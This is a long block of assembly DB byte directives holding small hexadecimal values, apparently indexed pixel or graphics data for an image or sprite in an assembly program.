DB 005H,005H,002H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,007H,007H
DB 008H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH,007H,008H,004H
DB 004H,001H,009H,001H,009H,004H,007H,007H,008H,005H,005H,008H,006H,001H,01CH
DB 01CH,01CH,01CH,003H,002H,011H,00AH,006H,007H,008H,005H,004H,001H,009H,001H
DB 009H,002H,009H,002H,009H,002H,009H,001H,004H,004H,004H,005H,008H,007H,007H
DB 002H,003H,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,003H,006H,006H,008H,005H
DB 005H,004H,001H,009H,001H,009H,002H,009H,002H,009H,002H,009H,001H,009H,001H
DB 004H,005H,008H,008H,006H,00AH,00AH,000H,003H,01CH,01CH,01CH,01CH,01CH,006H
DB 006H,008H,005H,005H,005H,004H,001H,004H,001H,004H,004H,005H,008H,007H,006H
DB 00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,007H,006H,00FH
DB 00FH,007H,012H,00FH,00FH,012H,012H,012H,00DH,00DH,014H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,00CH
DB 017H,01AH,018H,00EH,00DH,00FH,010H,010H,012H,012H,010H,00EH,005H,005H,013H
DB 012H,00EH,012H,010H,00EH,008H,005H,005H,005H,00EH,00CH,014H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,019H,00CH,019H,01AH,01AH,014H,00CH,008H,005H,005H,005H,005H,005H
DB 000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,00AH,007H,005H,005H,004H,004H
DB 004H,001H,004H,004H,005H,005H,005H,008H,006H,007H,01CH,01CH,01CH,01CH,01CH
DB 01CH,00BH,011H,00AH,007H,008H,005H,004H,001H,009H,001H,009H,002H,009H,002H
DB 009H,002H,009H,002H,009H,001H,004H,004H,005H,008H,007H,007H,004H,01BH,003H
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,00AH,007H,008H,005H,005H,004H,004H
DB 001H,009H,002H,009H,002H,009H,002H,009H,002H,009H,001H,009H,001H,004H,005H
DB 008H,007H,006H,00AH,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,006H,006H,007H
DB 008H,005H,005H,005H,005H,005H,005H,008H,008H,007H,00AH,004H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,002H,00FH,00FH,00FH,006H,007H,00FH
DB 00FH,00FH,010H,00FH,010H,00EH,00DH,00DH,013H,018H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,015H,00DH,017H,01AH,015H,00DH
DB 00DH,00FH,00FH,010H,012H,012H,010H,00EH,008H,005H,005H,00FH,012H,00EH,00EH
DB 012H,010H,00EH,005H,005H,004H,005H,010H,00CH,017H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 010H,017H,01AH,01AH,017H,00CH,008H,005H,005H,005H,005H,004H,000H,003H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,004H,00AH,007H,008H,005H,005H,005H,005H,005H
DB 005H,005H,008H,008H,006H,007H,003H,01CH,01CH,01CH,01CH,01CH,003H,004H,011H
DB 006H,007H,008H,005H,001H,009H,001H,009H,002H,009H,002H,009H,002H,009H,002H
DB 009H,002H,009H,001H,004H,005H,008H,007H,007H,004H,003H,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,003H,00AH,007H,008H,005H,004H,004H,001H,009H,001H,009H
DB 001H,009H,002H,009H,002H,009H,002H,009H,001H,009H,001H,005H,005H,007H,006H
DB 00AH,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,00AH,007H,008H,008H
DB 008H,008H,008H,008H,007H,006H,00AH,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,003H,000H,006H,00FH,00FH,006H,006H,00FH,00FH,00FH,00FH,007H
DB 010H,00EH,008H,002H,00BH,00EH,00EH,013H,016H,015H,018H,019H,019H,019H,019H
DB 019H,019H,018H,015H,014H,00DH,00DH,00DH,016H,013H,00DH,00DH,00DH,00FH,010H
DB 010H,00FH,012H,010H,00EH,00EH,00EH,008H,012H,012H,010H,010H,010H,010H,00EH
DB 00EH,00EH,008H,005H,00EH,00DH,00EH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,012H,016H,01AH
DB 01AH,017H,00CH,00EH,005H,005H,005H,005H,000H,000H,000H,003H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,001H,00AH,006H,008H,008H,008H,008H,008H,008H,008H,007H
DB 00AH,007H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00AH,006H,008H,005H
DB 004H,004H,001H,009H,002H,009H,002H,009H,002H,009H,001H,004H,004H,009H,001H
DB 004H,004H,005H,008H,007H,007H,004H,01BH,003H,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,00AH,007H,008H,005H,005H,004H,004H,001H,005H,005H,005H,004H,009H
DB 002H,009H,002H,009H,001H,009H,001H,004H,004H,005H,008H,006H,00AH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,006H,00AH,006H,006H,006H,006H
DB 006H,00AH,008H,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 000H,009H,00FH,00FH,006H,007H,007H,00FH,00FH,00FH,007H,007H,004H,003H,002H
DB 01CH,01CH,01CH,004H,008H,00CH,00EH,00EH,00DH,00DH,00DH,00DH,00DH,00DH,00DH
DB 00DH,00DH,00DH,00DH,00DH,00EH,004H,00EH,00DH,00DH,00DH,00DH,00DH,00DH,00DH
DB 00DH,00DH,00DH,00DH,00DH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH
DB 00CH,00CH,00CH,010H,00CH,012H,012H,013H,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00EH,017H,01AH,01AH,016H,00CH
DB 00EH,005H,005H,005H,004H,004H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,001H,006H,00AH,006H,006H,006H,006H,006H,00AH,006H,004H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,00AH,006H,008H,005H,004H,004H,004H
DB 001H,009H,002H,009H,002H,009H,004H,008H,007H,008H,008H,004H,001H,004H,005H
DB 008H,007H,007H,004H,003H,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,003H,006H
DB 006H,008H,005H,005H,004H,004H,005H,007H,006H,007H,008H,001H,009H,002H,009H
DB 002H,009H,001H,004H,004H,005H,005H,008H,006H,006H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,001H,008H,007H,007H,008H,005H,002H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,007H,00FH
DB 006H,006H,007H,00FH,00FH,006H,00FH,006H,007H,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,00BH,001H,00BH,004H,00BH,001H,00BH,001H,00BH,001H,009H
DB 002H,003H,000H,004H,00CH,014H,016H,017H,018H,018H,018H,018H,018H,018H,018H
DB 018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,018H,017H
DB 00EH,016H,018H,016H,00CH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,016H,00CH,019H,01AH,019H,00EH,00CH,005H,005H,005H
DB 005H,004H,005H,002H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,00BH,008H,007H,007H,007H,008H,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,009H,00AH,006H,008H,005H,004H,004H,001H,009H,001H,009H
DB 002H,009H,002H,005H,007H,006H,006H,006H,008H,004H,004H,005H,008H,007H,006H
DB 005H,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,007H,00AH,008H,008H
DB 005H,004H,005H,008H,006H,00AH,006H,008H,004H,002H,009H,002H,009H,001H,009H
DB 001H,004H,005H,005H,008H,006H,006H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,006H,006H,006H,006H,00FH
DB 00FH,006H,006H,00FH,010H,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,005H
DB 00DH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00EH,018H,01AH
DB 019H,00EH,013H,017H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 018H,014H,00CH,017H,019H,016H,00EH,00CH,00CH,004H,005H,005H,005H,004H,004H
DB 005H,000H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,00AH,006H,008H,005H,005H,004H,004H,001H,009H,001H,009H,002H,009H
DB 005H,007H,00AH,00AH,006H,007H,005H,004H,005H,008H,006H,006H,001H,003H,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,004H,00AH,007H,008H,005H,005H,005H
DB 007H,006H,00AH,006H,008H,001H,009H,001H,009H,001H,009H,001H,004H,004H,005H
DB 008H,008H,00AH,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,009H,00FH,006H,006H,007H,006H,00FH,006H,006H
DB 007H,007H,002H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,004H,00DH,017H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00EH,018H,01AH,019H,00DH,00CH
DB 00CH,00CH,010H,014H,016H,014H,016H,016H,016H,014H,014H,010H,00CH,00CH,00EH
DB 012H,00CH,00CH,00CH,00EH,005H,005H,004H,005H,005H,005H,005H,005H,002H,000H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H
DB 00AH,007H,008H,005H,005H,004H,004H,001H,009H,001H,009H,002H,005H,007H,006H
DB 00AH,006H,008H,005H,005H,005H,007H,00AH,007H,003H,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,003H,00AH,006H,008H,005H,005H,005H,008H,006H,006H
DB 006H,005H,009H,001H,009H,001H,009H,001H,004H,004H,005H,005H,008H,007H,00AH
DB 004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,000H,006H,006H,006H,007H,006H,006H,007H,006H,006H,001H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,009H,00DH,016H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,019H,00EH,017H,01AH,019H,00DH,004H,01CH,01CH,00BH
DB 001H,00BH,004H,005H,001H,004H,001H,004H,004H,00BH,004H,00BH,001H,004H,005H
DB 004H,008H,005H,005H,005H,004H,005H,005H,004H,004H,005H,000H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,009H,00AH,007H,008H
DB 005H,005H,004H,004H,004H,001H,009H,001H,009H,001H,008H,007H,007H,007H,005H
DB 004H,005H,008H,007H,00AH,009H,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,008H,00AH,007H,008H,005H,005H,005H,008H,008H,008H,004H,001H
DB 009H,001H,004H,001H,004H,004H,005H,005H,008H,008H,006H,006H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H
DB 002H,006H,006H,007H,007H,006H,007H,007H,008H,005H,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,005H,00DH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,00EH,018H,01AH,019H,00DH,00BH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,005H
DB 005H,005H,004H,004H,005H,004H,004H,005H,002H,000H,003H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,00AH,007H,008H,005H,005H
DB 004H,004H,004H,001H,009H,001H,004H,004H,005H,005H,005H,004H,005H,008H,008H
DB 00AH,007H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,00AH,006H,007H,008H,005H,005H,004H,004H,004H,001H,004H,001H,004H,004H
DB 004H,004H,005H,005H,008H,008H,007H,00AH,00BH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,008H,006H,006H
DB 007H,006H,006H,007H,006H,002H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 008H,00DH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H
DB 019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,018H
DB 00EH,016H,019H,017H,00DH,001H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H,005H,005H,005H,005H
DB 004H,005H,004H,004H,004H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH,006H,007H,008H,005H,005H,004H,004H
DB 004H,004H,004H,004H,004H,004H,004H,005H,005H,008H,008H,006H,00AH,002H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,001H,00AH
DB 006H,007H,008H,005H,005H,005H,004H,004H,004H,004H,004H,004H,004H,005H,005H
DB 008H,008H,007H,00AH,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,006H,006H,007H,007H,006H,006H
DB 006H,008H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,008H,00FH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00DH,00DH,00DH,00DH
DB 00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00CH
DB 00EH,00DH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,008H,005H,005H,005H,004H,004H,005H
DB 004H,004H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,001H,00AH,006H,007H,008H,005H,005H,005H,004H,004H,004H
DB 004H,004H,005H,005H,005H,008H,008H,007H,00AH,001H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,005H,00AH,006H,007H
DB 008H,008H,005H,005H,005H,005H,005H,005H,005H,005H,005H,008H,008H,007H,00AH
DB 007H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,009H,006H,006H,007H,006H,007H,006H,006H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,00FH,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00DH,018H,01AH,019H,014H,00DH,00DH
DB 00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00CH,002H,002H,009H,002H,009H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,002H,005H,005H,005H,004H,004H,005H,004H,004H,004H
DB 000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,004H,00AH,006H,007H,008H,008H,005H,005H,005H,005H,005H,005H,005H
DB 008H,008H,008H,007H,00AH,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,004H,00AH,006H,007H,008H,008H
DB 008H,008H,005H,005H,008H,008H,008H,008H,007H,006H,00AH,007H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,001H,006H,006H,007H,006H,006H,00FH,005H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,008H,00FH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,019H,00DH,019H,01AH,01AH,016H,00DH,00EH,00EH,00EH,00EH
DB 008H,008H,008H,005H,005H,004H,000H,000H,000H,000H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,002H,002H,005H,005H,004H,004H,004H,004H,004H,000H,000H,000H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 001H,006H,00AH,006H,008H,008H,008H,008H,008H,008H,008H,008H,008H,007H,006H
DB 00AH,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,006H,00AH,006H,007H,007H,008H,008H
DB 008H,007H,007H,007H,006H,00AH,00AH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,002H
DB 006H,006H,006H,006H,006H,006H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,008H,00FH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,019H,00FH,019H,01AH,01AH,016H,00DH,010H,00EH,00EH,00EH,010H,008H,008H
DB 005H,005H,005H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,005H,005H,004H,004H,004H,004H,004H,000H,000H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H
DB 00AH,00AH,006H,006H,007H,007H,007H,007H,006H,00AH,00AH,006H,004H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,007H,007H,006H,006H,006H,006H,006H,006H
DB 006H,007H,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,004H,006H,007H,006H
DB 006H,007H,002H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 008H,00FH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00FH
DB 019H,01AH,01AH,016H,00DH,010H,010H,010H,00EH,00EH,008H,008H,005H,005H,005H
DB 000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 002H,005H,004H,004H,004H,004H,004H,000H,000H,003H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,008H,007H
DB 007H,007H,007H,007H,007H,007H,008H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,002H,009H,002H,009H,01CH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
